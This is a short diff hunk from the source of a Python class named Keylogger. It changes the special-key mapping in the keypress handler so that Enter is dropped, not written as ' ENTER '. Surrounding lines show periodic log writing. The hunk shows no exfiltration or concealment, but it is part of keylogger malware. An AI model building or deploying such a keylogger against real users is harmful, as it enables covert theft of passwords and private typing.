@@ -15,7 +15,7 @@ class Keylogger:
         sleep(self.interval)
         self.writeLog()
     def on_press(self, key):
-        specialKeys = {"None":"", "Key.esc":"" , "Key.f1":"" , "Key.f2":"" , "Key.f3":"" , "Key.f4":"" , "Key.f5":"" , "Key.f6":"" , "Key.f7":"" , "Key.f8":"" , "Key.f9":"" , "Key.f10":"" , "Key.f11":"" , "Key.f12":"" , "Key.num_lock":"", "Key.pause":"", "Key.scroll_lock":"", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "CAPS_LOCK", "Key.tabNone" : "", "Key.enter": " ENTER " }
+        specialKeys = {"None":"", "Key.esc":"" , "Key.f1":"" , "Key.f2":"" , "Key.f3":"" , "Key.f4":"" , "Key.f5":"" , "Key.f6":"" , "Key.f7":"" , "Key.f8":"" , "Key.f9":"" , "Key.f10":"" , "Key.f11":"" , "Key.f12":"" , "Key.num_lock":"", "Key.pause":"", "Key.scroll_lock":"", "Key.print_screen":"", "Key.delete":"", "Key.insert":"", "Key.menu":"", "Key.cmd_r":"", "Key.tab":"", "Key.page_down": "", "Key.page_up": "", "Key.home": "", "Key.end": "", "Key.down": "", "Key.up": "","Key.right": "", "Key.left": "", "Key.ctrl_r": "", "Key.backspace": "","Key.shift_r": "" ,"Key.space": " ","Key.ctrl": "", "Key.shift": "", "Key.alt": "", "Key.cmd": "", "Key.caps_lock" : "CAPS_LOCK", "Key.tabNone" : "", "Key.enter": "" }
         noneKey = {"None":""}
         try:
             if str(key.char) in noneKey:
